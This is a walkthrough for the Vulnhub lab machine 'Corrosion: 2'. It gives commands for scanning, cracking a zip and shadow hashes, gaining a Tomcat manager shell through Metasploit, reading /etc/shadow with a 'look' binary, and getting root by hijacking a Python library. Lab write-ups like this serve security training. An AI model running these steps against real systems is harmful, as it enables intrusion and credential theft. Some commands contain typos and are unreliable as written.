Vulnhub - Corrosion: 2 Walkthrough

Video Walkthrough Link
https://www.youtube.com/watch?v=5jX7XbQ7fLQ&list=PL_Bj4ZvhLa37QWivDC6chQTanrxqdjWrh&index=1&t=322s

Lets Find the IP address of this machine
$sudo arp-scan -l

After getting the IP address of the machine, do an nmap scan
$nmap -sC -sV -p- <ip_vulnhubmachine>

you will get three open ports 22, 80 and 8080

go firefox and go to the page -> you will get an Apache Tomcat page

Do a Gobuster scan
$gobuster dir -u http://<ip_vulnhubmachine> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,zip

so you will see few relevant files and a folder
/backup.zip
/readme.txt
/manager

now lets take a look at them one by one

/readme.txt -> ou will see username 'randy', now take a look if you can login with this username

now go to http://<ip_vulnhubmachine>:8080/manager
this will ask for username and password

also look at /backup.zip and download the file
unzip the file

$unzip backup.zip
when you try to unzip the file it will ask you for a password

now crack the password for the zip file
$fcrackzip -v -u -D -p rockyou.txt backup.zip

you will get the password here

after extracting the file, look at tomcat-users.xml

you will the username and password for 'manager'

now go back to the page http://<ip_vulnhubmachine>/manager
you will be able to login to the page

$msfconsole -q

and search for tomcat
>> search tomcat

use the following explot from the list
'exploit/multi/http/tomcat_mgr_upload'

>> use 7

now we will set http port host
>> set HTTPPASSWORD <password>
>> set HTTPUSERNAME manaher
>> set RHOSTS <ip_vulnhubmachine>
>> set RPORT 8080
>> run

now get the shell
> shell

now try to spawn a shell here
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

check the home directory you will find two usernames

check if yoo are able to login with one of the username

login with 'jaye'
spawn the shell again
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

lets take a look at the directory structure and you will get a directory called 'Files'

you will get a file called 'look'
if you try to run it, you can observe this files looks for string patterns
./look

./look '' /etc/shadow
./look '' /etc/passwd
 
copy that and save this in a text file
now what you can do is convert this to hash

now use
$unshadow passwd shadow > hash

to find the password you will use john the ripper
$john -wordlist=rockyou.txt has

it will take a bit of a time to crack the password

now ssh into the machine
ssh randy@<ip_vulnhubmachine>

we will be now able to login
$sudo -l

take a look at the file /home/randy/randombase64.py

take a look at the doectory as well, you will find a note and the user flag

$nano /usr/lib/python3.8/base64.py

add a line
import os
os.system("/bin.bash")

save it and run the file

$sudo /home/randy/randombase64.py

now you will get the root shell so you can get the root flag
